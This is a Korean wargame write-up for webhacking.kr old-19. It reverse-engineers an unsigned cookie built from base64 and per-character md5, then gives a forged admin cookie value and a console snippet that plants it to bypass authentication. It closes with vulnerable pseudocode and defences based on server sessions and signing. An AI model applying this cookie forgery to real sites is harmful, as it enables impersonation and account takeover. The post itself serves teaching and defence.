---
title: "webhacking.kr old-19 풀이 — 클라이언트가 만든 쿠키를 믿는 인증"
description: "webhacking.kr old-19을 통해 사용자 식별을 쿠키 값에만 의존할 때 어떤 일이 벌어지는지, 문자별 md5로 인코딩된 쿠키를 어떻게 역추적해 admin으로 위조하는지, 그리고 왜 클라이언트가 보낸 값을 신뢰하면 안 되는지를 정리한다."
date: 2026-11-06
category: Web
tags: [webhacking.kr, web, wargame, cookie, authentication, md5, php]
---

[webhacking.kr](https://webhacking.kr)의 **old-19** 문제를 풀었다.
old-18이 "쿼리에 섞여 들어가는 입력"이었다면, old-19는 **"클라이언트가 들고 있는 쿠키를 그대로 믿는 인증"** 이 주제다.
서버가 신원을 **쿠키 값 하나로만** 판별하기 때문에, 그 쿠키를 직접 만들어 넣으면 곧바로 다른 사람이 된다.

이 글도 추측이 아니라 **실제로 서버에 값을 넣어 가며 쿠키 포맷을 역추적하고, admin 쿠키를 위조해 통과(`Pwned`)를 확인**한 과정을 그대로 정리한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-19 (`/challenge/js-6/`) |
| 배점 | 15점 |
| 유형 | 쿠키 위조 / 클라이언트 신뢰 인증 (Insecure client-side trust) |
| 목표 | `admin`으로 인식되게 만들어 통과 |

페이지에는 `id`를 입력하는 폼 하나뿐이다.

```html
<form>
id : <input type="text" name="id" value="admin" maxlength="5" size="5">
<input type="submit">
</form>
```

`maxlength="5"`에 기본값이 `admin`이라 "그냥 admin 넣으면 되겠지" 싶지만, 그대로는 통하지 않는다.
핵심은 폼이 아니라 **제출 뒤에 서버가 심는 쿠키** 에 있다.

## 2. 정보 수집 — 쿠키 관찰

폼은 `GET`으로 `index.php?id=...`를 호출한다. 평범한 값을 넣어 보면서 응답과 쿠키를 같이 본다.

```text
GET /challenge/js-6/index.php?id=test
→ 본문: "hello test"
→ Set-Cookie: userid=ZTM1OGVmYTQ4OWY1ODA2Mm...(base64)
```

`userid` 쿠키가 생긴다. 이 쿠키는 **HttpOnly가 아니라서** `document.cookie`로 바로 읽히고, 값은 base64다.
`test`로 받은 쿠키를 base64 디코딩하면 **128자리 16진수 문자열** 이 나온다.

```text
e358efa489f58062f10dd7316b65649e  e1671797c52e15f763380b45e841ec32
03c7c0ace395d80182db07ae2c30f034  e358efa489f58062f10dd7316b65649e
```

32자리씩 끊으니 네 덩어리다. `test`는 4글자, 그리고 **1번째 덩어리와 4번째 덩어리가 같다** — `test`의 첫 글자와 끝 글자가 모두 `t`인 것과 정확히 맞아떨어진다.
즉 **글자 하나당 16진수 32자리(= md5 한 개)** 가 대응된다는 가설이 선다.

## 3. 쿠키 구조 역추적 — 문자별 md5

가설을 확인하려고, 서버에 여러 `id`를 넣어 돌려받은 쿠키를 디코딩해 비교했다.
md5 값은 **내가 계산한 게 아니라 서버가 돌려준 쿠키를 디코딩한 것** 이라 그대로 믿을 수 있다.

| 입력 `id` | 디코딩된 16진수(32자리 단위로 분리) |
| --- | --- |
| `a` | `0cc175b9c0f1b6a831c399e269772661` |
| `b` | `92eb5ffee6ae2fec3ad71c777531578f` |
| `aa` | `0cc175b9...2661` + `0cc175b9...2661` |
| `abcde` | `0cc175b9...`(a) + `92eb5ffe...`(b) + `4a8a08f0...`(c) + `8277e091...`(d) + ... |
| `test` | `e358ef...`(t) + `e16717...`(e) + `03c7c0...`(s) + `e358ef...`(t) |

결론은 명확하다.

> `userid` 쿠키 = **base64( id의 각 글자 `c`에 대해 `md5(c)`를 순서대로 이어붙인 값 )**

- `0cc175b9c0f1b6a831c399e269772661` = `md5("a")`
- `92eb5ffee6ae2fec3ad71c777531578f` = `md5("b")`
- `e358efa489f58062f10dd7316b65649e` = `md5("t")`

서버는 이 쿠키를 받으면 **32자리씩 끊어 각 md5를 다시 글자로 역매핑** 해 `id`를 복원한다.
(md5는 원래 역산이 안 되지만, 입력이 **글자 하나**뿐이라 가능한 후보가 몇십 개로 작다 — 서버는 사실상 `문자→md5` 표를 미리 만들어 두고 뒤집어 찾는다.)

## 4. 문제점 — `admin` 입력만 막고, 쿠키는 그대로 믿는다

그렇다면 `id=admin`을 그냥 제출하면? **아무 일도 일어나지 않는다.**

```text
GET /challenge/js-6/index.php?id=admin
→ 본문: 로그인 폼만 다시 표시 ("hello admin" 없음)
→ Set-Cookie 없음 (userid 쿠키가 새로 설정되지 않음)
```

즉 서버는 **입력 단계에서 `admin`만 콕 집어 거부** 한다 — `admin`으로는 쿠키를 발급해 주지 않는다.
하지만 신원 판별은 **발급 경로가 아니라 쿠키 값** 으로 한다. 관찰한 동작을 의사 코드로 재구성하면 이렇다.

```php
<?php
// webhacking.kr은 이 문제의 소스를 공개하지 않는다.
// 아래는 "관찰된 동작"으로부터 재구성한 의사 코드다.

if (isset($_GET['id'])) {
  if ($_GET['id'] === "admin") {
    // admin 입력은 거부 — 쿠키도, 인사말도 내지 않는다
  } else {
    $enc = "";
    foreach (str_split($_GET['id']) as $ch) $enc .= md5($ch);  // 글자별 md5
    setcookie("userid", base64_encode($enc));
    echo "hello " . $_GET['id'];
  }
}
else if (isset($_COOKIE['userid'])) {
  $raw = base64_decode($_COOKIE['userid']);          // md5들이 이어 붙은 16진수
  $id  = "";
  foreach (str_split($raw, 32) as $h) $id .= md5_to_char($h);  // md5 → 글자 역매핑
  echo "hello " . $id;
  if ($id === "admin") { solve(19); /* ... Pwned ... */ }
}
?>
```

취약점은 선명하다. **입력 문자열(`$_GET['id']`)에는 `admin` 차단이 있지만, 쿠키를 복원하는 경로에는 아무 검증이 없다.**
쿠키는 전적으로 클라이언트가 보내는 값인데, 서버가 그걸 신원의 근거로 그대로 쓴다.

## 5. 익스플로잇 — admin 쿠키 위조

포맷을 알았으니 admin 쿠키는 직접 조립하면 된다.

> `userid` = base64( `md5("a")` + `md5("d")` + `md5("m")` + `md5("i")` + `md5("n")` )

각 글자의 md5는 **서버가 직접 돌려준 값** 을 썼다(단일 문자 `id`를 제출해 쿠키에서 추출).

| 글자 | md5 |
| --- | --- |
| `a` | `0cc175b9c0f1b6a831c399e269772661` |
| `d` | `8277e0910d750195b448797616e091ad` |
| `m` | `6f8f57715090da2632453988d9a1501b` |
| `i` | `865c0c0b4ab0e063e5caa3387c1a8741` |
| `n` | `7b8b965ad4bca0e41ab51de7b31363a1` |

다섯 개를 이어 붙이면 160자리 16진수가 되고, 이를 base64로 인코딩한다.

```text
raw   = 0cc175b9...2661 8277e091...91ad 6f8f5771...501b 865c0c0b...8741 7b8b965a...63a1
base64 = MGNjMTc1YjljMGYxYjZhODMxYzM5OWUyNjk3NzI2NjE4Mjc3ZTA5
         MTBkNzUwMTk1YjQ0ODc5NzYxNmUwOTFhZDZmOGY1NzcxNTA5MGRh
         MjYzMjQ1Mzk4OGQ5YTE1MDFiODY1YzBjMGI0YWIwZTA2M2U1Y2Fh
         MzM4N2MxYTg3NDE3YjhiOTY1YWQ0YmNhMGU0MWFiNTFkZTdiMzEz
         NjNhMQ==
```

이 값을 `userid` 쿠키로 설정하고, **`?id` 파라미터 없이** `index.php`를 연다.
`?id`를 빼는 이유는, 파라미터가 있으면 서버가 쿠키를 새로 덮어쓰기 때문이다 — 우리가 심은 쿠키를 그대로 읽게 하려면 입력 단계를 건너뛰어야 한다.

```js
// 브라우저 콘솔에서
document.cookie = "userid=MGNjMTc1Yjlj...NjNhMQ%3D%3D; path=/challenge/js-6/";
location.href = "index.php";
```

## 6. 결과

쿠키를 심고 `index.php`를 연 순간 서버가 나를 admin으로 복원했다.

```text
hello admin
old-19 Pwned. You got 15point. Congratz!
```

`alert('old-19 Pwned!')`가 뜨고 점수가 올라갔다. chall.php에서도 old-19이 풀린 문제로 표시된다.

> old-18과 마찬가지로 이 문제도 **따로 제출할 플래그 값이 없다.** 쿠키가 admin으로 복원되는 순간
> 서버가 `solve(19)`를 호출해 **그 쿠키 자체로 바로 통과** 처리된다.

## 7. 왜 취약한가 — 그리고 올바른 방어

핵심은 **"서버가 클라이언트가 보낸 값을 신원의 근거로 신뢰했다"** 는 것이다.
입력에서 `admin`을 막은 건 방어처럼 보이지만, 정작 판별은 **클라이언트가 자유롭게 바꿀 수 있는 쿠키** 로 한다.
게다가 쿠키가 **서명 없는 단순 인코딩(base64 + 문자별 md5)** 이라, 포맷만 알면 누구나 원하는 값으로 재조립할 수 있다.
md5는 여기서 암호가 아니라 그냥 **가역적인 인코딩** 에 불과하다 — 한 글자 md5는 표 한 번이면 뒤집힌다.

제대로 된 방어의 방향은 분명하다.

1. **신원은 서버가 쥔다.** 로그인 결과(사용자 id/권한)는 **서버 세션** 에 저장하고, 클라이언트에는 추측 불가능한 **세션 ID만** 준다. 인증 판단에 쿠키의 *내용* 을 직접 쓰지 않는다.
2. **클라이언트가 보유해야 한다면 변조 불가로 만든다.** 꼭 토큰을 클라이언트에 둬야 하면 **서버 비밀키로 서명(HMAC)하거나 암호화** 한다(JWT 등). 서명이 없으면 내용은 언제든 위조된다.
3. **입력 블랙리스트는 방어가 아니다.** `admin` 문자열만 막는 식의 차단은, 같은 신원에 도달하는 **다른 경로(여기선 쿠키)** 가 열려 있으면 아무 의미가 없다.

```php
// 서버 세션 기반 — 클라이언트는 신원을 "주장"할 수 없다
session_start();
if (로그인_성공($id, $pw)) {
  $_SESSION['id'] = $id;   // 신원은 서버에만
}
if (($_SESSION['id'] ?? '') === 'admin') { /* 관리자 처리 */ }
```

## 8. 정리

- 서버가 **쿠키 값 하나로 신원을 판별** 하면, 그 쿠키를 만들 수 있는 사람은 누구든 그 신원이 된다.
- `userid` 쿠키는 `base64(글자별 md5 이어붙이기)` — **서명 없는 가역 인코딩** 이라 포맷만 알면 admin으로 재조립된다.
- 입력에서 `admin`을 막아도, **쿠키 복원 경로에 같은 검증이 없으면** 차단은 무력화된다.
- 올바른 해법은 **서버 세션으로 신원을 관리** 하거나, 꼭 클라이언트에 둬야 하면 **서명/암호화로 변조를 막는 것**.

> "이 값을 클라이언트가 바꿀 수 있는가, 바꾸면 서버가 그대로 믿는가"를 먼저 묻는다.
> 쿠키·히든 필드·로컬스토리지에 담긴 신원은 전부 이 질문을 통과해야 한다.
